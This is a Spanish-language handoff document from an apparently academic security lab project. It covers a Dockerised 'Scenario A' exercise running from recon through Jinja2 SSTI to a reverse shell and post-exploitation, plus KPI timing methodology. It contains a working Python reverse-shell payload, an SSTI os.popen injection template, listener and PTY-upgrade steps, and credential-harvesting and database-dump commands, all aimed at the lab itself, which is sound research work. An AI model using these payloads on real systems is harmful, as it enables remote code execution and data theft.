# Handoff: continuación captura Escenario A + KPIs (actualizado 2026-05-12)

> Documento de retoma de trabajo. Resume decisiones, herramientas, errores ya entendidos y pasos concretos siguientes. No sustituye los ADR en [`admin/DECISIONS_LOG.md`](../../admin/DECISIONS_LOG.md) ni la plantilla operativa.

---

## 1. Objetivo pendiente (estado del proyecto)

- **Escenario A:** laboratorio perimetral funcional (HTB-style: recon → creds → login → SSTI → RCE → post-explotación).
- **Pendiente:** evidencias gráficas para memoria y cronometraje coherente según plantilla **v2** (véase §3).
- **Referencia admin:** tareas en [`admin/STATE.md`](../../admin/STATE.md) (D2: evidencias + KPIs nuevos).

---

## 2. Modelo de amenazas y cronometraje (no volver a equivocarse)

- Alcance validado con tutor: atacante externo **sin** acceso previamente a host físico ni credenciales de dominio; **asume RCE en el servicio web**; amenazas medidas = post-explotación (lateral, tráfico interno, exfiltración).
- **Consecuencia metodológica:** las métricas oficiales **G1–G3, E1–E3** se interpretan y cronometran en fase **post-RCE**. Lo anterior (recon, login, SSTI) es **caracterización del entry point**, no comparativa A vs B.
- **Documentación:** [`docs/02_reuniones_tutor/00_TIMELINE_CORREOS.md`](../../docs/02_reuniones_tutor/00_TIMELINE_CORREOS.md) §11–12; ADR **2026-05-12** en [`admin/DECISIONS_LOG.md`](../../admin/DECISIONS_LOG.md) (“pre-RCE vs post-RCE”).
- **Plantilla KPI v2:** [`tests/00_PLANTILLA_KPI_v2.md`](../../tests/00_PLANTILLA_KPI_v2.md) (§1.2.a caracterización pre-RCE; §1.2.b timings desde **`T0_efectivo`**). La v1 [`tests/00_PLANTILLA_KPI.md`](../../tests/00_PLANTILLA_KPI.md) queda solo histórica.

**`T0_efectivo`:** instante en que hay control post-RCE en `webapp` (p. ej. línea `Ncat: Connection from …` o primer prompt estable tras upgrade PTY). Todos los Δ de §1.2.b vs ese instante.

---

## 3. Inventario rápido de infra (valores útiles ya fijados en repo)

- **Puerto público:** `http://localhost:8080/` (nginx mapeado `8080:80` en compose).
- **Credenciales admin (information disclosure):** `admin` / `Empresa2026!` (definidas en código `webapp`, no solo en compose).
- **BBDD Postgres (servicio `db`):**
  - `POSTGRES_PASSWORD=supersecret`
  - `POSTGRES_DB=empresa_db`
  - Usuario por defecto de imagen official si no se define `POSTGRES_USER`: **`postgres`**
  - **`webapp` solo expone** `DB_HOST` y `DB_PASSWORD` por env; para `psql` desde `webapp` usar **usuario/databasename explícitos** (véase §8).

Fuente: [`infra/perimetral/docker-compose.yaml`](../../infra/perimetral/docker-compose.yaml).

---

## 4. Flujo operativo consolidado (una pasada recomendada)

### 4.1 Pre-RCE — solo navegador

Portal → cabeceras (DevTools) → `/robots.txt` → `/backup.txt` → login admin → SSTI confirmación `{{7*7}}` → evidencia §1.2.a plantilla v2. Exportar **HAR** con “Preserve log” al finalizar.

### 4.2 RCE estabilizada — listener (reglas duras)

- **Mac:** usar **`ncat -lvnp 4444`** (viene con nmap via `brew install nmap`).
- **`nc -lvnp` en BSD mac falla:** el `nc` de macOS no admite `-p` con `-l`; por eso se usa **`ncat`**.
- **No usar** para el interactive reverse shell **el terminal integrado de Cursor + `script` + `socat` + pipes** mezclados: provoca **pérdida de caracteres** (`id` → `d`), líneas pegadas y typescript vacío.
- **Receta estándar que funciona:** abrir **Terminal.app** (o iTerm):

  1. `ncat -lvnp 4444`
  2. lanzar reverse shell desde SSTI hacia **host.docker.internal:4444** (payload base64 + `render_template_string`/`popen` ya documentados en [`tests/RCE_notas.txt`](../../tests/RCE_notas.txt) si lo mantienes actualizado).
  3. en la shell del contenedor: `python3 -c 'import pty; pty.spawn("/bin/bash")'`
  4. en Mac: **`Ctrl+Z`**, luego `stty raw -echo`, luego **`fg`** (Intro si hace falta).
  5. Una sola vez: `export TERM=xterm-256color`, `export TZ=Europe/Madrid`, `export PS1='[\D{%H:%M:%S}] root@webapp:\w\$ '`, opcional `stty rows 40 cols 120`.

**Alternativa metodológica honesta** si se prioriza evidencia limpia: tras **screenshot** de `Connection from …` como `T0_efectivo`, ejecutar KPIs desde `docker compose exec -it webapp bash` declarando en §1.4 que equivalencia PTY garantiza reproducibilidad (decisión debe citarse en memoria una frase).

### 4.3 Post-RCE — comandos desde la shell estable

Ejecutar **un comando por línea** (o usar `cmd1 ; cmd2`); **evitar pegar dos líneas sin salto real** (`sleep 1tcpdump …` fue error real observado).

Orden típico alineado con plantilla/E3 ADR:

1. `id`, `hostname`, `env`, filtrado credencial a `/tmp/creds.txt`
2. `nmap` hacia servicios conocidos desde `webapp` → `/tmp/e1_scan.log`
3. **`tcpdump` en background** antes de **`curl`** al backend → `/tmp/lateral.pcap` (véase §6)
4. `curl http://backend:5000/empleados` → `/tmp/lateral.json`
5. acceso Postgres → `/tmp/dump.txt` (véase §8)

### 4.4 Cierre sesión evidencias host

Desde otro terminal (no matar compose hasta copiar artefactos):

```bash
SESSION=$(ls -td tests/logs/perimetral_sesion_* | head -1)
# ajustar nombres de contenedor proyecto si cambian el prefijo compose
docker compose -f infra/perimetral/docker-compose.yaml cp webapp:/tmp/lateral.pcap "${SESSION}/lateral.pcap"
docker compose -f infra/perimetral/docker-compose.yaml cp webapp:/tmp/lateral.json "${SESSION}/lateral.json"
docker compose -f infra/perimetral/docker-compose.yaml cp webapp:/tmp/creds.txt     "${SESSION}/creds.txt"
docker compose -f infra/perimetral/docker-compose.yaml cp webapp:/tmp/dump.txt      "${SESSION}/dump.txt"
docker compose -f infra/perimetral/docker-compose.yaml cp webapp:/tmp/e1_scan.log  "${SESSION}/e1_scan.log"
```

Motivo de copiar: el sistema de ficheros efímero del contenedor pierde `/tmp/` al hacer `compose down`; la plantilla pide rutas bajo **`tests/logs/`**.

**Script de ayuda:** [`tests/scripts/logcapture_perimetral.sh`](../../tests/scripts/logcapture_perimetral.sh) — sube compose, espera ENTER, vuelca `nginx.log`, `webapp.log`, etc.

---

## 5. SSTI reverse shell — recordatorio técnico mínimo

Python one-liner (IP del host vista desde Docker Desktop Mac):

```text
host.docker.internal:4444
```

Payload SSTI típico (base64 para evitar comillas hell):

```bash
PAYLOAD_PY='import socket,subprocess,os;s=socket.socket();s.connect(("host.docker.internal",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
printf '%s' "$PAYLOAD_PY" | base64
```

Plantilla campo `host` en `/admin/diagnostico` (tras login):

```jinja2
{{ config.__class__.__init__.__globals__['os'].popen('echo B64_AQUI | base64 -d | python3').read() }}
```

(no usar `chr()` en payloads Jinja Flask — context limitado.)

---

## 6. tcpdump

- **`tcpdump` no estaba** en Dockerfile original; si no se ha commiteado aún la mejora, instalar **en sesión** con `apt-get install -y tcpdump` o añadir a [`infra/perimetral/webapp/Dockerfile`](../../infra/perimetral/webapp/Dockerfile) junto curl/nmap.
- **`tcpdump -i any` WARN “promiscuous mode”**: normal en Docker; la captura sigue (LINUX_SLL2). Para comandos reproducibles usar interfaz física conocida tras `ip -brief link`: p. ej. `tcpdump -i eth1 … host backend` (validar tras `ip addr` en `webapp`).
- Ejemplo estable (dos líneas, no pegadas):

```bash
tcpdump -i eth1 -nn -w /tmp/lateral.pcap -c 50 host backend &
sleep 1
curl -s http://backend:5000/empleados | tee /tmp/lateral.json
```

---

## 7. Doble eco en transcripciones

Si cada comando aparece impreso dos veces en el guardado pero la salida es correcta (como `which tcpdump` mostrando ruta válida): es **artefacto de echo** en la cadena reverse; no invalida resultados. Mitigar con upgrade PTY (§4.2) y redactar nota en §1.4 plantilla.

---

## 8. PostgreSQL desde `webapp` — error ya diagnosticado

- **`psql: command not found`:** la imagen `webapp` **no incluye** cliente PostgreSQL por defecto (Dockerfile actual solo `curl nmap` — ver repo al retomar si se añadió `postgresql-client`).
- **No buscar** `DB_USER` / `POSTGRES_USER` en env de `webapp`: no están definidos en compose para `webapp`. Usar valores reales de Postgres:

```bash
PGPASSWORD=supersecret psql -h db -U postgres -d empresa_db -c 'SELECT count(*) FROM empleados; SELECT * FROM empleados LIMIT 5;' | tee /tmp/dump.txt
```

Si falta binario tras retomar:

```bash
apt-get update && apt-get install -y postgresql-client
```

---

## 9. Artefactos y carpetas útiles ya generados en el repo (referencia local)

Sesión ejemplo conocida por el operador:

- `tests/logs/perimetral_sesion_20260512_155313/` — evidencias intermedias (`lateral.json`, `e1_scan.log`, `creds.txt`, `compose_up.log`, etc.; **revisar** si `dump.txt` quedó vacío o incompleto por `psql`).
- `tests/img/perimetral_sesion_*` — capturas de navegador.
- `tests/RCE_notas.txt` — notas operativas del operador (mantener coherentes).

Al retomar, decidir si esa sesión se etiqueta como **ensayo** o **oficial** según checklist §10.

---

## 10. Checklist al volver (orden sugerido)

1. Confirmar Dockerfile `webapp`: ¿`tcpdump` y opcional **`postgresql-client`** y **`tzdata` + TZ** para timestamps alineados? Si no → editar Dockerfile, `compose up --build -d`.
2. Entorno limpio: `docker compose down -v` + `./tests/scripts/logcapture_perimetral.sh` (ENTER solo tras completar sesión ataques).
3. Terminal.app listener + secuencia PTY §4.2 OR decisión documentada exec §4.2 último párrafo.
4. Pre-RCE navegador + HAR §4.1.
5. Post-RCE comandos **línea a línea** §4.3 incl. `psql` §8 si cliente instalado.
6. `docker compose cp` artefactos §4.4; ENTER logcapture para volcar logs.
7. Rellenar [`tests/00_PLANTILLA_KPI_v2.md`](../../tests/00_PLANTILLA_KPI_v2.md) §1.2.a/b y §1.1.
8. Actualizar [`admin/STATE.md`](../../admin/STATE.md) tachando evidencias cuando quede sesión válida.

---

## 11. Referencias internas rápidas

| Tema | Ruta |
|------|------|
| ADR SSTI / docs | [`admin/DECISIONS_LOG.md`](../../admin/DECISIONS_LOG.md) |
| ADR KPI v2 pre/post RCE | mismo fichero entrada 2026-05-12 |
| Diseño refactor HTB | [`docs/04_diario_laboratorio/20260509a_Sesion_Refactor_EscenarioA_HTB.md`](20260509a_Sesion_Refactor_EscenarioA_HTB.md) |
| Guía SSTI | [`docs/01_investigacion/20260509b_Apuntes_SSTI_Jinja2.md`](../01_investigacion/20260509b_Apuntes_SSTI_Jinja2.md) |
| Análisis KPI | [`docs/04_diario_laboratorio/20260510a_Sesion_Analisis_KPI_Aplicabilidad.md`](20260510a_Sesion_Analisis_KPI_Aplicabilidad.md) |
| Compose | [`infra/perimetral/docker-compose.yaml`](../../infra/perimetral/docker-compose.yaml) |

---

*Fin del handoff. Próximo paso inmediato al retornar: §10 punto 1 (Dockerfile) + repetición de sesión en Terminal.app.*
